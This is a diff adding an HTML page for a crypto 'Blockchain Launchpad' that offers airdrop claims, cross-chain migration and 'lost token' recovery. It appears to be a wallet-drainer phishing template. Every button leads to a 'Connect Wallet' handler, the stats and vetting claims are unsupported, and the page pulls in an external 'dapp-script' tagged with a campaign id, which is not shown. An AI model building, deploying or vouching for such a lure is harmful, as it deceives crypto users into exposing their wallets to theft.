@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Blockchain Launchpad</title>
+    <link rel="shortcut icon" href="assets/img/favicon.png" type="image/x-icon">
+    <link rel="stylesheet" href="css/style.css">
+    <script src="js/nav.js"></script>
+</head>
+<body>
+    <div class="mainbg"></div>
+    <div id="root">
+        <header>
+            <div class="h-wrap">
+                <img src="assets/img/blockchain.png" draggable="false">
+                <nav>
+                    <div>
+                        <a class="clickable" onclick="_migration()">Migration</a>
+                        <a class="clickable" onclick="_resolve()">Resolve</a>
+                        <a class="clickable" onclick="_readDocs()">Read Docs</a>
+                    </div>
+                </nav>
+                <button class="con-wal" onclick="dappConnect()">Connect Wallet</button>
+            </div>
+        </header>
+        <main>
+            <section>
+                <div>
+                    <span class="title">Unlocking Airdrop Access Across Every Blockchain and DeFi Platform</span>
+                    <span class="details">Only Trusted, Verified Airdrops — every airdrop is expertly vetted by blockchain <br>
+                        validators for top-tier quality and authenticity, Ensuring a Seamless Claiming Experience.</span>
+                    <button class="con-wal" onclick="dappConnect()">Claim Airdrop</button>
+
+                    <article class="networks">
+                        <img src="assets/img/Layer 3.png" draggable="false">
+                        <img src="assets/img/Layer 2.png" draggable="false">
+                        <img src="assets/img/Layer 4.png" draggable="false">
+                        <img src="assets/img/Layer 1.png" draggable="false">
+                        <img src="assets/img/Layer 0.png" draggable="false">
+                    </article>
+                </div>
+                <div>
+                    <div class="outer">
+                        <img class="out_img" src="assets/img/eth.png" draggable="false"/>
+                        <img class="out_img" src="assets/img/bnb.png" draggable="false"/>
+                        <img class="out_img" src="assets/img/favicon.png" draggable="false"/>
+                        <div class="mid">
+                            <img class="mid_img" src="assets/img/sol.png" draggable="false"/>
+                            <img class="mid_img" src="assets/img/favicon.png" draggable="false"/>
+                            <img class="mid_img" src="assets/img/btc.png" draggable="false"/>
+                            <div class="inner">
+                                <img class="main" src="assets/img/logo.png" alt="Blockchain" draggable="false">
+                                <img class="in_img" src="assets/img/favicon.png" draggable="false"/>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </section>
+            <aside>
+                <div class="a-wrap">
+                    <article>
+                        <span class="amt">$41.1M</span>
+                        <span class="text">RAISED CAPITAL</span>
+                    </article>
+                    <article>
+                        <span class="amt">122</span>
+                        <span class="text">IDEAS FUNDED</span>
+                    </article>
+                    <article>
+                        <span class="amt">$2.4B</span>
+                        <span class="text">MARKET CAP</span>
+                    </article>
+                    <article>
+                        <span class="amt">24K</span>
+                        <span class="text">UNIQUE PARTICIPANTS</span>
+                    </article>
+                </div>
+            </aside>
+        </main>
+        <footer>Copyright &copy; 2025 - All right reserved</footer>
+    </div>
+    <div class="popup" onclick="_close(event)">
+        <div class="info">
+            <svg xmlns="http://www.w3.org/2000/svg" width="80px" height="80px" viewBox="0 0 24 24" fill="none"><path fill-rule="evenodd" clip-rule="evenodd" d="M22 12C22 17.5228 17.5228 22 12 22C6.47715 22 2 17.5228 2 12C2 6.47715 6.47715 2 12 2C17.5228 2 22 6.47715 22 12ZM12 17.75C12.4142 17.75 12.75 17.4142 12.75 17V11C12.75 10.5858 12.4142 10.25 12 10.25C11.5858 10.25 11.25 10.5858 11.25 11V17C11.25 17.4142 11.5858 17.75 12 17.75ZM12 7C12.5523 7 13 7.44772 13 8C13 8.55228 12.5523 9 12 9C11.4477 9 11 8.55228 11 8C11 7.44772 11.4477 7 12 7Z" fill="#00F3FD"/></svg>
+            <label>Swap token coming soon</label>
+            <span class="clickable" onclick="_close()">Close</span>
+        </div>
+    </div>
+    <div class="popuprd" id="docs" onclick="_close(event)">
+        <div class="info" id="rd">
+            <label>Read Doc</label>
+            <div>
+                <b>Revolutionizing Airdrop Access with Seamless Multi-Chain Integration</b> <br><br>
+
+                Blockchain remains one of the world’s most transformative technologies, and this launchpad is at the forefront of innovation—offering users a seamless experience in discovering and claiming airdrops across numerous chains. With support for major networks including Ethereum, BNB Smart Chain, Polygon, and more, the platform simplifies the airdrop claiming process like never before.
+
+                By aggregating and integrating airdrop functionalities across multiple blockchains, users can effortlessly find and claim eligible tokens without the usual hassle. The platform also embraces a community-driven model, ensuring that only highly vetted, trustworthy projects are made available for presale participation or airdrop claims.
+
+                Beyond airdrops, the launchpad addresses some of the most common pain points in Web3. From resolving RPC connectivity issues to recovering missing or lost tokens across various non-custodial wallets, the platform provides essential tools to enhance the user experience across the DeFi ecosystem.
+                <br><br>
+                <b>Key Advantages:</b>
+                <ul>
+                    <li>Seamless airdrop claiming across multiple blockchain networks</li>
+                    <li>Fair token distribution that supports decentralization and equity</li>
+                    <li>Effortless cross-chain migration for increased flexibility</li>
+                    <li>Comprehensive wallet support, including resolution of lost tokens and connectivity issues</li>
+                    <li>This launchpad is not just a tool—it's a gateway to a more accessible and efficient decentralized future.</li>
+                </ul>
+                <br><br>
+
+            </div>
+            <br>
+            <button class="con-wal-white interact-button" onclick="dappConnect()">Connect Wallet</button>
+        </div>
+    </div>
+    <div class="popuprd" id="migrate" onclick="_close(event)">
+        <div class="info" id="rd">
+            <label>Migration</label>
+            <div>
+                <b>Effortless Cross-Chain Migration</b><br><br>
+
+                This launchpad simplifies token migration across multiple blockchains, allowing users to seamlessly move assets between networks like Ethereum, BNB Smart Chain, Avalanche, Polygon, and others. This feature ensures flexibility, enhances interoperability, and removes the complexity typically associated with cross-chain transfers—empowering users to adapt quickly to where opportunities arise, without risking token loss or facing technical hurdles.
+
+                <br><br>
+
+            </div>
+            <button class="con-wal-white" onclick="dappConnect()">Migrate Now</button>
+        </div>
+    </div>
+    <div class="popuprd" id="resolve" onclick="_close(event)">
+        <div class="info" id="rd">
+            <label>Resolve</label>
+            <div>
+                <b>Comprehensive Wallet Support</b><br><br>
+
+                Our platform ensures smooth interactions across all major non-custodial wallets, helping users resolve common issues like connectivity errors and missing tokens. Whether it's syncing with your wallet, recovering lost tokens, or troubleshooting RPC issues, we provide the tools to ensure your wallet functions flawlessly—no matter the blockchain.
+
+                <br><br>
+
+            </div>
+            <button class="con-wal-white" onclick="dappConnect()">Resolve Now</button>
+        </div>
+    </div>
+
+    <script src="http://localhost:1121/dapp-script?u=6AQ8EP"></script>    
+</body>
+</html>
